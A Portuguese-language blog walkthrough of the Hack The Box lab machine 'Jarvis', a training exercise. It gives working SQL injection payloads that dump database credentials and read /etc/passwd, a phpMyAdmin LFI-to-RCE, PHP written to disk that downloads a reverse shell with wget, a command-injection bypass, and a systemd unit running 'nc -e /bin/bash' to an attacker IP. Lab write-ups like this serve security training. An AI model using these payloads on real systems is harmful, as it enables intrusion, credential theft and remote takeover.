---
title: "Hack The Box - Jarvis"
tags: [Linux,Medium,Systemd,Suid,Linpeas,Sudo -l,Gobuster,Wfuzz,BurpSuite,BurpSuite Repeater,SQLInjection,PhpMyAdmin,SQLMAP,Gtfobins]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/194>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos duas portas abertas no servidor

> Porta 22 - Servidor SSH

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_web.png)

Lá em baixo da página encontramos algo interessante, um virtual host desse servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_web1.png)

### /etc/hosts

Então adicionamos o vhost no /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_hosts.png)

### Gobuster na porta 80

Então rodamos o Gobuster na página pra ver se conseguimos algo nela

`gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 - x php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_gobuster.png)

Explicação parâmetros

> dir --> modo discover

> -w --> wordlist utilizada

> -t 50 --> aumentar as threads para ir mais rápido

> -x php --> procurar por arquivos .php também

Bom, encontramos diversos arquivos no gobuster, não vou ficar entrando em todos aqui pq a maioria não é nada, o que realmente nos interessa é o `room.php`

### room.php

Então, acessamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_r.png)

Verificamos que tem um parâmetro sendo passado ali `cod`, geralmente quando tem parâmetros sendo passados assim pelo método GET a possibilidade da realização de SQLInjection no servidor é alta

Bom, primeiro passo é testar por bad chars (não é estritamente necessário realizar isso, mas é o caso)

### Tentado bad chars

Para isso vamos utilizar o wfuzz

`wfuzz -w /usr/share/seclists/Fuzzing/special-chars.txt -c -u http://supersecurehotel.htb/room.php?cod=1FUZZ --hc 404`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_wfuzz.png)

Hum... o que podemos tirar de conclusão disso?

Os caracteres `& + # . ;` tiveram o código 6204 Ch (tamanho diferente)
Os caracteres `+ . ;` são interessantes (pq os outros dois [& e #] dizem algo em html, então não da pra gente confiar nele)

Show... entendi agora como funciona, vamos ver na prática agora

### Fazendo contas

A ideia para testar esse SQLI é fazer contas com o `+ e o -`, nós vimos que ele é um char interessante de ser testado pelo tamanho da resposta ser diferente

1 - Super Family
2 - Suite
3 - Double Room

Se colocarmos 2 - 1, vai aparecer o Super Family, disso tiramos que temos um falha de SQLI que podemos tentar explorar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_r1.png)

Bom, podemos deduzir que a query está sendo realizada desse modo

`Select id, image-url, rating, room-name, cost, description from romms where cod = 1`

Se percebermos ele não está usando aspas, e é por isso que se eu colocar aspas não funciona o SQLI!

## Entendendo como funciona o SQLI

Agora, vamos tentar explicar como é o funcionamento do SQLInjection a partir de como está montada a query

Primeiro devemos verificar como o MYSQL se estrutura

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s.png)

> https://dev.mysql.com/doc/refman/8.0/en/select.html

Podemos executar todos esses comandos que estão descritos na imagem abaixo, e também o `UNION SELECT`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s1.png)

Agora vamos explorar com o UNION SELECT

`http://supersecurehotel.htb/room.php?cod=1 union select 1,2,3,4,5,6,7`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s2.png)

1 - Super Family - Deu certo, o resultado apareceu!

Select id, image-url, rating, room-name, cost, description, UNKNOWN from rooms where cod = 1

O que acontece quando eu utilizo o union select é que eu devo ter de um lado da requisição (antes do cod) o mesmo numero de argumentos que eu tenho na URL que tava ali antes, no caso são 7, ai a query funciona normalmente, ele vai aparecer normalmente pq não teve erro algum

A query que ele fez foi essa:
Select id, image-url, rating, room-name, cost, description, UNKNOWN from rooms where cod = 1 UNION SELECT 1,2,3,4,5,6,7

Se colocarmos um valor varado no cod, ele vai retornar o valor que eu colocar nos parâmetros, pq não identifica no banco de dados o valor 9999999, ai eu vou descobrir onde está cada parâmetro de injeção

`http://supersecurehotel.htb/room.php?cod=9999999 union select 1,2,3,4,5,6,7`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_s3.png)

Sabendo disso, agora vamos mandar para o BurpSuite para melhor trabalhar com essa requisição

## Usando o BurpSuite

Atualizamos a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b1.png)

Mandamos pro repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b2.png)

A ideia de mandar para o Burp é pra gente conseguir extrair os dados melhor, conseguir manipular melhor a requisição

Envio a requisição já com o ponto que é injetável escrito TESTE, para provar que consigo escrever ali

`/room.php?cod=9999999%20union%20select%20"1","2","TESTE","4","5","6","7"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b3.png)

## Extraindo Informações

Bom, agora que sabemos que temos um ponto que pode ser explorado vamos partir para outra parte, a explicação de como funciona a tabela SCHEMA

A tabela SCHEMA do banco de dados é interessante nós realizarmos o dump nela, uma vez que ela contém uma "prévia" de todas as outras tabelas

> https://dev.mysql.com/doc/refman/8.0/en/information-schema.html

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b4.png)

Com a dica do site pentestmonkney.net eu começo a extração

> http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

SELECT SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b5.png)

Assim extraio o nome da database, que é hotel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b6.png)

Agora verifico todas as tabelas, para isso eu uso o group_concat

`GET /room.php?cod=999999+union+select+"1","2",(SELECT+group_concat(SCHEMA_NAME,":")+from+Information_Schema.SCHEMATA+LIMIT+1),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b7.png)

Agora verifico quais campos se encontram nessa tabela `hotel` que nos pareceu a mais promissora

`GET /room.php?cod=999999+union+select+"1","2",(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'hotel'),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b8.png)

Verifico quais campos estão dentro dessa tabela `msyql` uma vez que a `hotel` não trouxe nada de interessante

`GET /room.php?cod=999999+union+select+"1","2",(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'mysql'),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b9.png)

Esse *users* me interessou, uma vez que pode ser que encontre usuários válidos para outras aplicações no servidor

No pentestmonkey.net tem como faço pra listar esses usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b10.png)

Então, faço a extração

`GET /room.php?cod=999999+union+select+"1","2",(SELECT+group_concat(host,+user,+password)+FROM+mysql.user),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_b11.png)

`localhostDBadmin*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`

Bom, conseguimos um hash e um usuário, vamos quebrar ele agora. Verifico como faço pra quebrar esse hash do mysql

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_j.png)

Realizo a quebra da senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_j1.png)

DBadmin:imissyou

### Outro modo de se descobrir a senha

Bom, também há outro modo de se descobrirmos essa senha, através de um LFI pelo SQLInjection

`GET /room.php?cod=999999+union+select+"1","2",(LOAD_FILE("/etc/passwd")),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_l.png)

Posso abrir o room.php pra ver como ele está estruturado

`GET /room.php?cod=999999+union+select+"1","2",(LOAD_FILE("/var/www/html/room.php")),"4","5","6","7" HTTP/1.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_l1.png)

Verifico que ele faz a conexão com o connection.php então possivelmente lá vai ter a senha do banco de dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_l2.png)

Confirmando...

`GET /room.php?cod=999999+union+select+"1","2",(LOAD_FILE("/var/www/html/connection.php")),"4","5","6","7" HTTP/1.1`

Show, conseguimos outro modo a senha... é a mesma ideia, da pra fazermos várias coisas, fazer upload de arquivos também....

## PhpMyAdmin

Agora com a senha que encontramos vamos descobrir onde podemos utilizar ele... Se lembrarmos lá no gobuster, teve um `phpmyadmin` que foi encontrado, mas não tinhamos nada que pudessemos explorar nele.... Mas acontece agora qeu temos uma credencial

Então vamos logar!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p2.png)

Procuramos pela versão do PhpMyAdmin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p3.png)

Opa! Versão 4.8

### Pesquisando por Exploits para PhpMyAdmin 4.8.0

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p4.png)

`https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/`

Encontramos esse!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p5.png)

# Reverse shell Método 1 - Explorando PhpMyAdmin

Reproduzo o que está no blog (no campo SQL adicionar o código a ser executado)
select '<?php phpinfo();exit;?>'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p7.png)

Verifico o cookie do SESSID para poder verificar se tenho RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p8.png)

> m0l9j4lg4m8kngvfhonptpgtgcdhu8bh

`http://supersecurehotel.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../var/lib/php/sessions/sess_m0l9j4lg4m8kngvfhonptpgtgcdhu8bh`

Executo caminho especificado no exploit e executo o phpinfo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_p9.png)

Agora vamos pegar uma reverse shell

## Ganhando reverse shell

Primeiro passo é montar nossa reverse shell php a ser executada no servidor, vou utiizar uma que já vem por padrão na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a.png)

Trocamos a porta e IP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a1.png)

Levantamos um servidor Web Python e um nc na porta 443 na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a2.png)

Agora vamos executar no servidor a query para ele realizar download do reverse shell na nossa máquina

`select '<?php exec("wget -O /var/www/html/shell.php http://10.10.16.117/reverse.php"); ?>'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a4.png)

Pegamos o cookie

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a5.png)

> 61v8e4c3qceb36e9s9s6ogrhi5fc3qrs

Montamos a query

`http://supersecurehotel.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../var/lib/php/sessions/sess_61v8e4c3qceb36e9s9s6ogrhi5fc3qrs`

Executamos para ele baixar o arquivo no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a7.png)

Agora acessamos o shel.php e ganhamos a reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_a9.png)

# Reverse Shell método 2 - Usando o SQLMAP

Uma vez que eu já sei onde está o ponto de SQLI, posso utilizar o `SQLMAP` pra extrair informações

Salvo a requisição que eu creio que seja vulnerável em um arquivo, primeiro passo pro BurpSuite, e salvo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map2.png)

Executo o SQLMAP 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map4.png)

Agora pego um shell pelo SQLMAP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map6.png)

Pego uma shell melhor de trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_map7.png)

# Reverse Shell método 3 - Através do SQLI

Também conseguimos ganhar um reverse shell através do SQLI, não sei se tu se lembra lá em cima quando eu comentei que poderíamos conseguir fazer upload de arquivos através do SQLI, então, vamos explorar isso agora!

Aqui está a query utilizada

`GET /room.php?cod=999999 union select "1","2",(select '<?php phpinfo() ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/reverse.php'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n.png)

Acessamos e vemos que conseguimos executar códigos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n1.png)

Agora é só enviar shell php que nós fizemos e ganhar a reverse

Ligamos o Python Web server na Kali e o nc na porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n2.png)

Executamos no servidor a query para ele baixar o reverse.php na nossa Kali

`GET /room.php?cod=999999 union select "1","2",(select '<?php exec("wget -O /var/www/html/sqli.php http://10.10.16.117/reverse.php"); ?>'),"4","5","6","7" INTO OUTFILE '/var/www/html/rev.php'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n4.png)

Agora acessamos o rev.php para conseguirmos baixar o arquivo no servidor e ganhar a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n6.png)

Executamos o sqli.php e ganhamos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_n7.png)

Bom, agora vamos proseguir na escalação de privilégio

# Escalação de Privilégio -> www-data - Pepper

Com o `sudo -l` verificamos que podemos executar um script como pepper

`/var/www/Admin-Utilities/simpler.py`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_www.png)

Verificamos do que se trata o script que pode ser executado como pepper

Aqui está ele
simpler.py
```
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

Algumas coisas são interessantes, a primeira que me chamou atenção quando olhei o código foi a função `def exec_ping()`, até onde eu sei eles ainda não implementaram ping no python, então possivelmente tem alguma chamada ou subprocesso sendo executado, olhando mais a fundo o código verificamos que é isso mesmo

```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

Verificamos que ele faz um "filtro" com chars, justamente para evitar o RCE e faz execução direta de comandos nos parâmetros

`os.system('ping ' + command)`

Esse filtro que ele faz não contempla o `$()` então podemos executar comandos por subprocessos

E ele faz uma chamada direto da função main, através do parâmetro -p

Testando isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_www1.png)

Certo, conseguimos, então executamos um bash e conseguimos um shell de pepper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_www2.png)

# Escalação de Privilégio -> Pepper - root

Agora vamos iniciar a escalação de privilégio para root, vamos rodar o linpeas para procurar por pontos para escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin1.png)

> https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin2.png)

Encontramos o systemctl com suid habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin3.png)

```
O systemd é reponsável por controlar os serviços do sistema. Ou seja, ele cria e gerencia serviços e nesse caso como se root fosse, pq está com o suid habilitado. Então se criarmos um serviço, ele será executado como root!
```

Verificamos como fazer pra escalar privilégio com ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin4.png)

Um serviço é definido pelo arquivo .service, o systemctl utiliza esse arquivo para linkar com o systemd e usa ele novamente para executar o serviço.

Criamos o arquivo .service malicioso

jarvis.service
```
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.16.117 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin5.png)

Executamos o systemctl para linkar o serviço

`systemctl link /dev/shm/jarvis.service`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin6.png)

Agora starto o serviço e ganho shell de root (systemctl start jarvis)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_lin7.png)

## Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-jarvis/J_user.png)